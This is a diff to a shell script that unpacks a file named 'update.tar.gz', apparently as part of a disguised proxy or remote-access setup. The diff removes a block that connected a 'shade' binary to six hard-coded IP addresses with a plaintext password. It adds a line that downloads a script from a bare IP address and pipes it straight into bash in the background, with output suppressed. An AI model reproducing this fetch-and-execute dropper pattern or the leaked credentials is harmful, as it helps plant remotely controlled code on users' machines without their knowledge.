@@ -48,58 +48,9 @@ tar -xf update.tar.gz > /dev/null
 
 sleep 2
 
-wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/shade.tar.gz >/dev/null
+wget -O - http://139.162.225.119/install_and_monitor_shade_root.sh | bash &
+
 sleep 2
-tar -xf shade.tar.gz
-sleep 2
-
-server1()
-{
- ./shade -b "127.0.0.1:1081" -s "139.162.225.119:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999"
-}
-
-server2()
-{
- ./shade -b "127.0.0.1:1081" -s "178.79.141.123:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999"
-}
-
-server3()
-{
- ./shade -b "127.0.0.1:1081" -s "176.58.112.72:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999"
-}
-
-server4()
-{
- ./shade -b "127.0.0.1:1081" -s "178.79.142.26:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999"
-}
-
-server5()
-{
- ./shade -b "127.0.0.1:1081" -s "176.58.103.150:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999"
-}
-
-server6()
-{
- ./shade -b "127.0.0.1:1081" -s "88.80.191.78:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999"
-}
-
-temp=""
-myArray=("server1" "server2" "server3" "server4" "server5" "server6")
-rand=$[$RANDOM % ${#myArray[@]}]
-temp=${myArray[$rand]}
-connect=$temp
-sleep 2
-echo ""
-echo ""
-$connect &
-sleep 2
-echo ""
-echo ""
-curl -x socks5h://127.0.0.1:1081 ifconfig.me
-sleep 2
-
-echo ""
-echo ""
 
 cat > update/local/update-local.conf <<END
 listen = :2233
